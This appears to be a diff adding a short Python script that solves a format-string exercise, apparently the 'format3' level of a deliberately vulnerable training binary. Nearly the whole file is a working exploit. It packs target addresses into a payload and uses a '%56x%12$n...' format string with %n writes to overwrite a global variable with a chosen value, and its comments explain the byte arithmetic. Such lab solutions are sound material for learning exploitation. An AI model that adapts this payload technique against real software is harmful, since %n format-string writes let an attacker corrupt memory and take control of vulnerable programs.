@@ -1,0 +1,28 @@
+#!/usr/bin/python
+
+#  $ objdump -t format3 | grep target
+#  080496f4 g     O .bss	00000004              target
+#
+# target needs to be set to 0x01025544
+#
+
+
+# address of target
+target = "\xf4\x96\04\x08"
+
+# addresses of adjacent bytes, writing 1 at a time
+# due to the $n writing to that location from format
+
+
+addr  = "\xf5\x96\x04\x08"
+addrs = "\xf6\x96\x04\x08"
+
+# we need to write target with a value of 0x01025544
+
+# write values to address of target: (hex)
+# 44 then a 55 then overflow ff to get 02 and 01
+# the amounts specified by the %NUMx -> 56 + 17 + 173
+
+format = "%56x%12$n%17x%13$n%173x%14$n"
+payload = target + addr + addrs + format
+print payload
